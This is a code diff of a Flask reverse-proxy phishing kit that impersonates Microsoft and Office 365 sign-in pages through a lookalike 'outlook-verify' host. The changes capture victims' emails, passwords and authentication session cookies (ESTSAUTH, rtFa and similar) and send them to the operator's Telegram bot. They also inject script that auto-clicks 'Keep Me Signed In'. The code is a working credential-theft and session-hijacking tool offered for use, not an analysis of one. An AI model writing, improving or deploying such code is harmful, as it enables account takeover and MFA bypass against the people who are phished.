@@ -2,6 +2,7 @@ import os
 import uuid
 import requests
 from flask import Flask, request, Response
+import sys
 
 app = Flask(__name__)
 
@@ -14,20 +15,66 @@ PROXY_HOST = "outlook-verify.onrender.com"
 
 # vid -> requests.Session (per victim)
 visitor_sessions = {}
-# vid -> {"email":..., "password":..., "sent_pw":..., "sent_cookies":...}
+# vid -> {"email":..., "password":..., "sent":...}
 CAPTURED = {}
 
+def log(msg):
+    print(f"[APP LOG] {msg}", flush=True)
 
 # --- Telegram ---
 def send_telegram(message):
     try:
-        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
-        resp = requests.post(url, json={"chat_id": TELEGRAM_CHAT_ID, "text": message, "parse_mode": "HTML"}, timeout=10)
-        print(f"[TG API] Status: {resp.status_code}")
-        if resp.status_code != 200:
-            print(f"[TG API] Error: {resp.text}")
+        log("Attempting to send Telegram message...")
+        resp = requests.post(
+            f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage",
+            json={"chat_id": TELEGRAM_CHAT_ID, "text": message, "parse_mode": "HTML"},
+            timeout=10,
+        )
+        if resp.status_code == 200:
+            log("✅ Telegram message sent successfully.")
+        else:
+            log(f"❌ Telegram API error: {resp.status_code} - {resp.text}")
     except Exception as e:
-        print(f"[TG ERROR] {e}")
+        log(f"❌ [TG ERROR] {e}")
+
+
+# --- Cookie capture after login ---
+def check_and_send(vid):
+    info = CAPTURED.get(vid)
+    if not info:
+        return
+    
+    if info.get("sent"):
+        return
+
+    sess = visitor_sessions.get(vid)
+    if not sess:
+        log(f"⚠️ No session found for vid {vid}")
+        return
+
+    cookies = sess.cookies.get_dict()
+    log(f"🍪 Checking cookies for vid {vid}: {list(cookies.keys())}")
+    
+    # Check for significant auth cookies
+    # Microsoft often uses ESTSAUTH, ESTSAUTHPERSISTENT, rtFa, MSAuth
+    auth_cookies = []
+    for k, v in cookies.items():
+        if any(x in k for x in ["ESTS", "rtFa", "MSAuth", "BAP"]):
+            auth_cookies.append((k, v))
+            
+    if auth_cookies:
+        info["sent"] = True
+        cookie_str = "\n".join(f"<code>{k}={v}</code>" for k, v in auth_cookies)
+        
+        msg = (
+            f"<b>✅ Office 365 Catch</b>\n\n"
+            f"<b>Email:</b> <code>{info.get('email', '?')}</code>\n"
+            f"<b>Password:</b> <code>{info.get('password', '?')}</code>\n\n"
+            f"<b>Cookies:</b>\n{cookie_str}"
+        )
+        send_telegram(msg)
+    else:
+        log(f"⚠️ No auth cookies found yet for vid {vid}. Captured password: {bool(info.get('password'))}")
 
 
 # --- Multi-value Set-Cookie extraction ---
@@ -76,13 +123,15 @@ def get_session(vid, user_agent):
         s.headers.update({
             "User-Agent": user_agent or "Mozilla/5.0",
             "Accept-Language": "en-US,en;q=0.9",
+            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
         })
         visitor_sessions[vid] = s
+        log(f"🆕 Created new session for vid: {vid}")
     return visitor_sessions[vid]
 
 
 def pick_upstream(path):
-    if path.startswith(("GetCredentialType.srf", "ppsecure/", "api/")):
+    if path.startswith(("GetCredentialType.srf", "ppsecure/", "api/", "common/oauth2")):
         return "https://login.live.com"
     return "https://login.microsoftonline.com"
 
@@ -95,6 +144,7 @@ def proxy(path):
     if not vid:
         vid = str(uuid.uuid4())
         new_vid = True
+        log(f"👀 New visitor detected. Assigned vid: {vid}")
 
     sess = get_session(vid, request.headers.get("User-Agent"))
 
@@ -106,24 +156,29 @@ def proxy(path):
     for h in ("Accept", "Accept-Language", "Content-Type", "Origin"):
         if h in request.headers:
             headers[h] = request.headers[h]
+    
+    # Preserve Referer but rewrite it to upstream
     if "Referer" in request.headers:
-        headers["Referer"] = request.headers["Referer"].replace(
-            PROXY_DOMAIN, "https://login.microsoftonline.com"
-        )
+        ref = request.headers["Referer"]
+        ref = ref.replace(PROXY_DOMAIN, "https://login.microsoftonline.com")
+        ref = ref.replace(PROXY_HOST, "login.microsoftonline.com")
+        headers["Referer"] = ref
+        
     if "Origin" in headers:
         headers["Origin"] = "https://login.microsoftonline.com"
 
     try:
         if request.method == "POST":
-            # Log form keys to debug what Microsoft sends
-            print(f"[POST DATA] Keys: {list(request.form.keys())}")
+            log(f"📩 POST request to {target} for vid {vid}")
+            # Allow redirects to ensure we catch the final auth cookies
             resp = sess.post(
                 target, data=request.form, headers=headers,
-                allow_redirects=False, timeout=25,
+                allow_redirects=True, timeout=25,
             )
         else:
-            resp = sess.get(target, headers=headers, allow_redirects=False, timeout=25)
+            resp = sess.get(target, headers=headers, allow_redirects=True, timeout=25)
     except Exception as e:
+        log(f"❌ Proxy error: {e}")
         return f"Proxy error: {e}", 502
 
     # --- Capture credentials from the login POST ---
@@ -134,44 +189,16 @@ def proxy(path):
             or request.form.get("login")
             or request.form.get("username")
         )
-        
         if passwd:
-            print(f"[CAPTURED PASSWORD] Vid: {vid}, User: {login}")
+            log(f"🔑 Password captured for vid {vid}: {login}")
             prev = CAPTURED.get(vid, {})
             CAPTURED[vid] = {
                 "email": login or prev.get("email"),
                 "password": passwd,
-                "sent_pw": prev.get("sent_pw", False),
-                "sent_cookies": prev.get("sent_cookies", False),
+                "sent": prev.get("sent", False),
             }
-            
-            # Send password immediately to ensure we don't lose it
-            if not CAPTURED[vid]["sent_pw"]:
-                CAPTURED[vid]["sent_pw"] = True
-                msg = (
-                    f"<b>🔑 Password Captured</b>\n\n"
-                    f"<b>Email:</b> <code>{login}</code>\n"
-                    f"<b>Password:</b> <code>{passwd}</code>\n\n"
-                    f"<i>Waiting for session cookies...</i>"
-                )
-                send_telegram(msg)
-
-    # --- Check for Cookies and Update Previous Message ---
-    info = CAPTURED.get(vid)
-    if info and not info.get("sent_cookies"):
-        cookies = sess.cookies.get_dict()
-        auth_cookies = {k: v for k, v in cookies.items() if k.startswith(("ESTSAUTH", "MSFPC", "MSPRequ", "ANON", "RPSSecAuth"))}
-        
-        if auth_cookies:
-            info["sent_cookies"] = True
-            cookie_str = "\n".join(f"<code>{k}={v}</code>" for k, v in auth_cookies.items())
-            msg = (
-                f"<b>🍪 Session Cookies Captured</b>\n\n"
-                f"<b>Email:</b> <code>{info.get('email', '?')}</code>\n\n"
-                f"<b>Cookies:</b>\n{cookie_str}"
-            )
-            send_telegram(msg)
-            print(f"[COOKIE SENT] Vid {vid}")
+            # Trigger check immediately after password capture
+            check_and_send(vid)
 
     # --- Build response ---
     r = Response(status=resp.status_code)
@@ -190,6 +217,7 @@ def proxy(path):
     if "text/html" in content_type:
         text = body.decode("utf-8", errors="ignore")
         text = rewrite_links(text)
+        # Inject auto-click for KMSI (Keep Me Signed In) if present
         inject = """
         <script>
         (function(){
@@ -218,8 +246,13 @@ def proxy(path):
         r.headers.add("Set-Cookie", fix_set_cookie(value))
 
     if new_vid:
+        # Set vid cookie with long expiry
         r.set_cookie("vid", vid, max_age=86400, path="/", samesite="Lax")
 
+    # Final check for cookies if not already sent
+    if request.method == "GET":
+        check_and_send(vid)
+        
     return r
 
 
